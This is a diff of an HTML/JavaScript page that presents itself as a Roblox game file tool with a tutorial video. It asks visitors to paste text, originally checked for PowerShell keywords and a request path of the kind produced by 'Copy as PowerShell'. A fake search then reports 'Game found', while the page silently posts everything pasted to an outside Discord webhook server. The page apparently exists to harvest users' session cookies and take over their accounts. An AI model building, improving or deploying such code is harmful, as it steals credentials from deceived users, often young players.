@@ -17,7 +17,6 @@
     padding-bottom: 50px;
   }
 
-  /* Bouton YouTube */
   .yt-button {
     position: fixed;
     top: 20px;
@@ -35,9 +34,7 @@
     z-index: 10;
   }
 
-  .yt-button:hover {
-    transform: scale(1.1);
-  }
+  .yt-button:hover { transform: scale(1.1); }
 
   .yt-button img {
     width: 100px;
@@ -45,7 +42,7 @@
   }
 
   .box {
-    background: rgba(0, 0, 0, 0.7);
+    background: rgba(0,0,0,0.7);
     padding: 40px;
     border-radius: 16px;
     width: 450px;
@@ -53,9 +50,6 @@
     box-shadow: 0 8px 24px rgba(0,0,0,0.3);
     margin-top: 80px;
   }
-
-  h2 { margin-bottom: 10px; }
-  p { margin-bottom: 20px; }
 
   textarea {
     width: 100%;
@@ -65,21 +59,18 @@
     border: none;
     padding: 10px;
     font-family: monospace;
-    font-size: 14px;
     resize: none;
   }
 
   button {
     width: 100%;
     padding: 12px;
-    font-size: 16px;
     border-radius: 12px;
     border: none;
-    cursor: not-allowed;
     background: gray;
     color: white;
     font-weight: bold;
-    transition: background 0.3s, transform 0.2s;
+    cursor: not-allowed;
     margin-bottom: 10px;
   }
 
@@ -88,20 +79,12 @@
     cursor: pointer;
   }
 
-  button.enabled:hover {
-    background: #16a34a;
-    transform: scale(1.05);
-  }
-
-  /* Titre TUTORIAL */
   .tutorial-title {
-    margin-top: 40px;
-    margin-bottom: 15px;
+    margin: 40px 0 15px;
     font-weight: bold;
     font-size: 20px;
   }
 
-  /* Style pour la vidéo */
   .video-container {
     width: 560px;
     max-width: 90%;
@@ -111,18 +94,10 @@
     box-shadow: 0 8px 24px rgba(0,0,0,0.3);
   }
 
-  .video-container iframe {
-    width: 100%;
-    height: 100%;
-    border: none;
-  }
-
-  /* Modale */
   .modal {
     display: none;
     position: fixed;
-    top:0; left:0;
-    width:100%; height:100%;
+    inset: 0;
     background: rgba(0,0,0,0.5);
     justify-content: center;
     align-items: center;
@@ -134,13 +109,11 @@
     padding: 30px;
     border-radius: 20px;
     text-align: center;
-    color: white;
     min-width: 300px;
   }
 
-  /* Loader */
   .loader {
-    border: 6px solid #f3f3f3;
+    border: 6px solid #eee;
     border-top: 6px solid #22c55e;
     border-radius: 50%;
     width: 60px;
@@ -150,8 +123,7 @@
   }
 
   @keyframes spin {
-    0% { transform: rotate(0deg);}
-    100% { transform: rotate(360deg);}
+    to { transform: rotate(360deg); }
   }
 
   .game-found {
@@ -160,25 +132,21 @@
   }
 
   .modal button {
-    cursor: pointer;
     background: #22c55e;
     border: none;
-    color: white;
     padding: 10px 20px;
     border-radius: 12px;
     font-weight: bold;
-    font-size: 16px;
+    cursor: pointer;
   }
 </style>
 </head>
 <body>
 
-<!-- Bouton chaîne YouTube -->
 <a class="yt-button"
    href="https://www.youtube.com/@AndroidOwnedScripterOwner"
-   target="_blank"
-   title="Visit YouTube Channel">
-  <img src="https://www.freeiconspng.com/uploads/youtube-logo-png-photo-0.png" alt="YouTube">
+   target="_blank">
+  <img src="https://www.freeiconspng.com/uploads/youtube-logo-png-photo-0.png">
 </a>
 
 <div class="box">
@@ -190,19 +158,12 @@
   <button id="download" disabled>Download file</button>
 </div>
 
-<!-- Titre Tutorial -->
 <div class="tutorial-title">TUTORIAL</div>
 
-<!-- Embed vidéo YouTube -->
 <div class="video-container">
-  <iframe src="https://www.youtube.com/embed/hi7QJJ4bphU" 
-          title="YouTube video player" 
-          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-          allowfullscreen>
-  </iframe>
+  <iframe src="https://www.youtube.com/embed/hi7QJJ4bphU" allowfullscreen></iframe>
 </div>
 
-<!-- Modale -->
 <div class="modal" id="modal">
   <div class="modal-content">
     <div class="loader" id="loader"></div>
@@ -215,30 +176,16 @@
 const input = document.getElementById("input");
 const submitBtn = document.getElementById("submit");
 const downloadBtn = document.getElementById("download");
-
 const modal = document.getElementById("modal");
 const loader = document.getElementById("loader");
 const gameName = document.getElementById("gameName");
 const okButton = document.getElementById("okButton");
 
-// Vérification PowerShell
-function isPowerShell(text) {
-  const keywords = ["$", "Get-", "Set-", "New-", "Invoke-", "Write-Host", "Start-Process"];
-  return text.trim() !== "" && keywords.some(k => text.includes(k));
-}
-
-// Activer/désactiver le submit
 input.addEventListener("input", () => {
-  if(isPowerShell(input.value)) {
-    submitBtn.disabled = false;
-    submitBtn.classList.add("enabled");
-  } else {
-    submitBtn.disabled = true;
-    submitBtn.classList.remove("enabled");
-  }
+  submitBtn.disabled = input.value.trim() === "";
+  submitBtn.classList.toggle("enabled", !submitBtn.disabled);
 });
 
-// Submit
 submitBtn.addEventListener("click", () => {
   modal.style.display = "flex";
   loader.style.display = "block";
@@ -247,36 +194,32 @@ submitBtn.addEventListener("click", () => {
 
   const textValue = input.value;
 
-  // Simulation recherche "path"="/games/id/nom"
+  // 🔹 Recherche URL Roblox
   setTimeout(() => {
-    const regex = /path\s*=\s*["']\/games\/(\d+)\/([^"']+)["']/i;
+    const regex = /https?:\/\/www\.roblox\.com\/games\/(\d+)\/([A-Za-z0-9\-]+)/i;
     const match = regex.exec(textValue);
-    if(match) {
-      const id = match[1];
-      const name = match[2];
-      loader.style.display = "none";
-      gameName.textContent = `Game found: ${name}`;
-      gameName.style.display = "block";
-      okButton.style.display = "inline-block";
-    } else {
-      loader.style.display = "none";
-      gameName.textContent = `Error game not found try later`;
-      gameName.style.display = "block";
-      okButton.style.display = "inline-block";
-    }
-  }, 1000); // délai pour effet "loading"
 
-  // Envoyer à Discord
+    loader.style.display = "none";
+
+    if (match) {
+      const gameNameClean = match[2].replace(/-/g, " ");
+      gameName.textContent = `Game found: ${gameNameClean}`;
+    } else {
+      gameName.textContent = "Error: Roblox game not found";
+    }
+
+    gameName.style.display = "block";
+    okButton.style.display = "inline-block";
+  }, 1000);
+
+  // 🔹 Envoi webhook quoi qu'il arrive
   fetch("https://discord-webhook-server-uhrf.onrender.com/send", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ content: textValue })
-  }).catch(() => {
-    console.error("Erreur webhook");
-  });
+  }).catch(() => {});
 });
 
-// OK Button
 okButton.addEventListener("click", () => {
   modal.style.display = "none";
   downloadBtn.disabled = false;
